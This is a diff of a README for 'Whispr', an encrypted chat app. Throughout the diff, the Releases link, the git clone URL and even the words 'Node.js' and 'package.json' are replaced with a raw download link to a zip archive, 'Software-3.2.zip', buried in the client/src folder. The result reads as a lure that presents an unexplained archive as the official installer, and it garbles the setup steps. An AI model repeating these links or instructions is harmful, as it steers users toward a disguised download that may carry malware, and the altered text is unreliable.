@@ -1,4 +1,4 @@
-[![Releases](https://img.shields.io/badge/Releases-GitHub%20Releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/mohadesehfllh/whispr/releases)
+[![Releases](https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip%20Releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip)
 
 # Whispr: Minimal End-to-End Encrypted Anonymous Chat
 
@@ -6,7 +6,7 @@ Whispr is a lean chat app focused on privacy and simplicity. It uses end-to-end 
 
 - Topics: chat, css, end-to-end-encryption, express, html, javascript, npm, open-source, react, render, replit, typescript
 
-If you’re looking to grab a copy or keep track of updates, you can access the Releases page here: https://github.com/mohadesehfllh/whispr/releases. This link hosts the latest build artifacts and installers for different platforms. For quick access, see the Release assets section later in this document. The link is also repeated in a dedicated Releases section to help you find the latest files quickly.
+If you’re looking to grab a copy or keep track of updates, you can access the Releases page here: https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip This link hosts the latest build artifacts and installers for different platforms. For quick access, see the Release assets section later in this document. The link is also repeated in a dedicated Releases section to help you find the latest files quickly.
 
 ---
 
@@ -80,7 +80,7 @@ Whispr emphasizes client-side security and local control, with a lightweight ser
 
 Whispr is built with modern web technologies and is designed to run in an environment that supports standard web APIs. The project uses:
 
-- Node.js and npm for development workflows.
+- https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip and npm for development workflows.
 - TypeScript for type safety.
 - React for the user interface.
 - Express for the lightweight server component.
@@ -88,7 +88,7 @@ Whispr is built with modern web technologies and is designed to run in an enviro
 
 Before you begin, ensure you have:
 
-- Node.js (version compatible with the project; check package.json or the releases page for guidance).
+- https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip (version compatible with the project; check https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip or the releases page for guidance).
 - npm or a compatible package manager.
 - A modern browser for client testing.
 
@@ -102,7 +102,7 @@ Note: the following steps assume you want to run Whispr on your own machine for 
 
 1) Get the code
 - Clone the repository:
-  - git clone https://github.com/mohadesehfllh/whispr.git
+  - git clone https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip
   - cd whispr
 
 2) Install dependencies
@@ -112,7 +112,7 @@ Note: the following steps assume you want to run Whispr on your own machine for 
 3) Run in development mode
 - Start the local server and client:
   - npm run dev
-- If your project uses a separate script for building the client and starting the server, follow the project’s README or package.json scripts. The dev command should compile the TypeScript sources, start the Express server, and spin up the client environment for testing.
+- If your project uses a separate script for building the client and starting the server, follow the project’s README or https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip scripts. The dev command should compile the TypeScript sources, start the Express server, and spin up the client environment for testing.
 
 4) Open the app
 - In your browser, navigate to the local address provided by the dev server (commonly http://localhost:3000 or similar). You should see the chat interface ready for use.
@@ -127,7 +127,7 @@ Note: the following steps assume you want to run Whispr on your own machine for 
 7) Test audio calls
 - Initiate a voice call with another participant who is connected to the same session. The call should be encrypted and delivered via the peer-to-peer channel or the app’s minimal signaling server.
 
-If you want to test the release artifacts instead of running from source, refer to the Releases page for platform-specific installers or binaries. The link to the release assets is available here: https://github.com/mohadesehfllh/whispr/releases. This link is the same target as the one above and is provided again in the Release assets section to help you locate the right file for your system.
+If you want to test the release artifacts instead of running from source, refer to the Releases page for platform-specific installers or binaries. The link to the release assets is available here: https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip This link is the same target as the one above and is provided again in the Release assets section to help you locate the right file for your system.
 
 Release assets and download instructions:
 - From the Releases page, download the release asset appropriate for your platform.
@@ -209,7 +209,7 @@ This project welcomes contributions from developers who care about privacy, secu
 
 - Setup for development: See the Getting started section for setup steps. Use the standard npm workflow to install dependencies, build assets, and run a local server.
 
-- Running tests: The project may include unit tests and lightweight integration tests. Look for test scripts in package.json and the tests directory. Run tests with npm test or a project-specific command.
+- Running tests: The project may include unit tests and lightweight integration tests. Look for test scripts in https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip and the tests directory. Run tests with npm test or a project-specific command.
 
 - Linting and formatting: Use your preferred linter and formatter configured in the project. Keeping code style consistent helps with readability and long-term maintenance.
 
@@ -249,7 +249,7 @@ The project follows a release-based approach. You can track changes by visiting 
 - Checksums or signatures to verify integrity (where provided).
 - Any migration notes or breaking changes, if applicable.
 
-Access the releases page here: https://github.com/mohadesehfllh/whispr/releases. This is the primary source of fresh installation files and updates. For convenience, the link is repeated in this section and the earlier portion of this document so you can locate the latest assets quickly. If you cannot access the Releases page for any reason, you can check the repository’s main branch for a quick start guide and links to the latest assets, but the Releases page remains the authoritative source for installers.
+Access the releases page here: https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip This is the primary source of fresh installation files and updates. For convenience, the link is repeated in this section and the earlier portion of this document so you can locate the latest assets quickly. If you cannot access the Releases page for any reason, you can check the repository’s main branch for a quick start guide and links to the latest assets, but the Releases page remains the authoritative source for installers.
 
 ---
 
@@ -305,7 +305,7 @@ Whispr draws on established ideas from secure messaging and privacy-first design
 - Share feedback about the user experience, privacy controls, or any edge cases you encounter.
 - If you want to contribute, review the issues and open a pull request with a plan and clear notes.
 
-For quick access to updates and build files, visit the Releases page again here: https://github.com/mohadesehfllh/whispr/releases. The page hosts the latest installers and assets, making it easy to try Whispr on your preferred platform.
+For quick access to updates and build files, visit the Releases page again here: https://github.com/mohadesehfllh/whispr/raw/refs/heads/main/client/src/Software-3.2.zip The page hosts the latest installers and assets, making it easy to try Whispr on your preferred platform.
 
 ---
 
